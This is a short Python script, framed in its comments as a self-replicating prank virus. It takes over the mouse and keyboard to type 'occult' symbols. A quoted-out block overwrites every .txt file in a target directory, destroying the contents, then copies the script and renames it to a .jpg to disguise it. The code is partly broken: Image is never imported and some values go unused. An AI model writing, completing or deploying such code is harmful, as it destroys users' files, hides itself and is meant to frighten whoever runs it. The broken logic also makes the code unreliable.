# the purpose of the program is :
    # 1. at runtime, starts to display more and more occult symbols as time goes by, 
        # which disappear almost immediately after their appearance.
    # 2. replicates itself in files: with each infected file (thus with each replication), a horrific image is displayed, 
        # then disappears almost immediately. 
        # So as time goes by, more and more horrific images will be displayed, faster and more often.
    # 3. modifies infected files to hide occult symbols, horrific images, and creepy sentences.



import os
import shutil
import random
import time
import tkinter as tk
import pyautogui


# here is the list of occult symbols to display on user screen
symbols = ['☥', '☦', '☧', '☨', '☩', '☫', '☬', '☼', '☽', '☾', '☿', '♀', '♁', '♂', '♃', '♄', '♅', '♆', '♇', '♈', '♉', '♊', '♋', '♌', '♍', '♎', '♏', '♐', '♑', '♒', '♓', '♙', '♰', '♱']


# display random symbols for the list on the user screen

# Generate a random symbol and position
symbol = symbols[random.randint(0, len(symbols) - 1)]
x, y = pyautogui.position()

# Simulate a mouse click at the random position and display the random symbol
new_x, new_y = random.randint(0, pyautogui.size().width), random.randint(0, pyautogui.size().height)
pyautogui.click(x, y)
pyautogui.typewrite(symbol, interval=10)


"""


# Navigate to the target directory
os.chdir('/path/to/target/directory')

# Modify files and create a copy of the script
for root, dirs, files in os.walk('.'):
    for file in files:
        if file.endswith('.txt'):
            with open(os.path.join(root, file), 'w') as f:
                f.write('This file has been modified by the script')
        elif file == 'script.py':
            shutil.copy('script.py', os.path.join(root, 'copy_of_script.py'))

# Create and display a random image
image = Image.new('RGB', (500, 500))
image.show()

# Hide the script in user files
with open('hidden_file.txt', 'w') as f:
    f.write('This file contains occult symbols and images')
os.rename('script.py', 'hidden_file.jpg')

"""